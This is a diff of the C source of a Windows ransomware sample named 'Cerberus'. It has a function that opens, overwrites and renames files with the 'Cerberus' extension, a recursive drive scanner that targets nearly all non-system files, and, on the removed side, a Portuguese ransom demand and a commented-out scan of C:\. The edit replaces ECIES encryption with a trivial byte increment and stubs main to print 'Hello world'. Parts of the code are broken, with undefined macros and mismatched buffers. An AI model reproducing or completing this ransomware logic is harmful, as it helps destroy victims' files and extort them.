@@ -1,34 +1,14 @@
-#include <stdlib.h>
 #include <stdio.h>
-#include <string.h>
-#include <Windows.h>
-#include "dirent.h"
-#include "AE.h"
-#define MAX_PATH 1024
-#define extension_name "Cerberus"
-#include "crip.h"
-// voce pode
-
-void  mudar_papel(){
+#include <stdlib.h>
+#include <windows.h>
+#define ext"Cerberus"
+void Encrypt_File(char *filename)
 {
-	  
-}
-
-void encerrar_processo(char *name){
-
-
-
-
-
-
-}
-void file_incri(char * filename){
-  char *in = NULL,*out = NULL;
+    char *in = NULL,*out = NULL;
 	HANDLE file_fd = NULL;
 	DWORD file_size = 0,written_bytes,read_bytes,cnt = 0,ThreadID = 0,Orig;
 
 	char ransom_name[MAX_PATH];
-
 
 
 	if((file_fd = CreateFile(filename,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,
@@ -80,7 +60,9 @@ void file_incri(char * filename){
 	SetFilePointer(file_fd,0,0,FILE_BEGIN);
 
 	 /* Encrypt ! */
-	 ECIES_encryption(out,out,sizeof out,"32900","35000");
+	  for(int i=0;i<file_size;i++){
+        in[i]+=1;
+	  }
 
 	if(WriteFile(file_fd,out,file_size,&written_bytes,NULL) == 0)
 	{
@@ -92,19 +74,19 @@ void file_incri(char * filename){
 	/* Free */
 	FREE_ALL
 
+	/* Rename */
+	strcpy(ransom_name,filename);
+	strcat(ransom_name,ext);
+	MoveFile(filename,ransom_name);
 
-	strcpy(extension_name,filename);
-	strcat(filename,extension_name);
-	MoveFile(filename,extension_name);
+	/* Increment :) */
 
 
-
-
-
+	 /* MsG for user */
 
 }
 
-
+/* This is the function used to scan drives for files */
 void S3arch(char *pt) {
 	 char sc[MAX_PATH],buf[MAX_PATH];
 	 WIN32_FIND_DATA in;
@@ -136,26 +118,22 @@ void S3arch(char *pt) {
 
 		 /* is it good to encrypt ? */
 
-		 if( !strstr(in.cFileName,".dll")
+		 if(!strstr(in.cFileName,ext) && !strstr(in.cFileName,".dll")
 			 && !strstr(in.cFileName,".exe") && !strstr(in.cFileName,".ini") &&
 			     !strstr(in.cFileName,".vxd") && !strstr(in.cFileName,".drv") &&
 				 strcmp(in.cFileName,"..") != 0 && strcmp(in.cFileName,".") != 0)
 		 {
-			 file_incri(buf);
+			 Encrypt_File(buf);
 		 }
 	 }
 
  }while(FindNextFile(fd,&in));
 
  FindClose(fd);
-}
 
+}
 int main(){
 
-
-
-//S3arch("C:\\");
-//mudar_papel();
-printf(" Seu computador foi infectado com ransoware pague o resgate para ter seus arquivos de volta");
-
+    printf("Hello world!\n");
+    return 0;
 }
